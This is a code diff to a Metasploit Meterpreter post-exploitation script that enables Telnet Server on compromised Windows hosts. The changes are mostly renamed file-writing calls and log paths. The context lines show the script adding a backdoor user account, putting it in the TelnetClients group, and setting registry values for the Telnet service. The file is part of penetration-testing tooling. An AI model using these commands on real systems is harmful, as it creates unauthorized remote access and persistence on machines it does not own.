@@ -1,10 +1,7 @@
 # $Id$
-#
-#Meterpreter script for enabling Telnet Server on Windows 2003, Windows Vista
-#Windows 2008 and Windows XP targets using native windows commands.
-#Provided by Carlos Perez at carlos_perez[at]darkoperator.com
-#Note: If the Telnet Server is not installed in Vista or win2k8
-#	it will be installed.
+# $Revision$
+# Author: Carlos Perez at carlos_perez[at]darkoperator.com
+#-------------------------------------------------------------------------------
 ################## Variable Declarations ##################
 @client = client
 host_name = client.sys.config.sysinfo['Computer']
@@ -12,7 +9,7 @@ host_name = client.sys.config.sysinfo['Computer']
 filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")
 
 # Create a directory for the logs
-logs = ::File.join(Msf::Config.log_directory, 'gettelnet', host_name + filenameinfo )
+logs = ::File.join(Msf::Config.log_directory,'scripts', 'gettelnet')
 
 # Create the log directory
 ::FileUtils.mkdir_p(logs)
@@ -61,12 +58,12 @@ def insttlntsrv()
 					end
 				end
 			end
-			file_local_write2file(@dest,"execute -H -f cmd.exe -a \"/c ocsetup TelnetServer /uninstall\"")
+			file_local_write(@dest,"execute -H -f cmd.exe -a \"/c ocsetup TelnetServer /uninstall\"")
 			print_status("Finished installing the Telnet Service.")
 			
 		end
 	elsif trgtos =~ /2003/
-		file_local_write2file(@dest,"reg setval -k \"HKLM\\SYSTEM\\CurrentControlSet\\services\\TlntSvr\\\" -v 'Start' -d \"1\"")
+		file_local_write(@dest,"reg setval -k \"HKLM\\SYSTEM\\CurrentControlSet\\services\\TlntSvr\\\" -v 'Start' -d \"1\"")
 	end
 end
 #---------------------------------------------------------------------------------------------------------
@@ -100,7 +97,7 @@ def addrdpusr(username, password)
 	print_status "\tAdding User: #{username} with Password: #{password}"
 	begin
 		cmd_exec("net user #{username} #{password} /add")
-		file_local_write2file(@dest,"execute -H -f cmd.exe -a \"/c net user #{username} /delete\"")
+		file_local_write(@dest,"execute -H -f cmd.exe -a \"/c net user #{username} /delete\"")
 		print_status "\tAdding User: #{username} to local group TelnetClients"
 		cmd_exec("net localgroup \"TelnetClients\" #{username} /add")
 
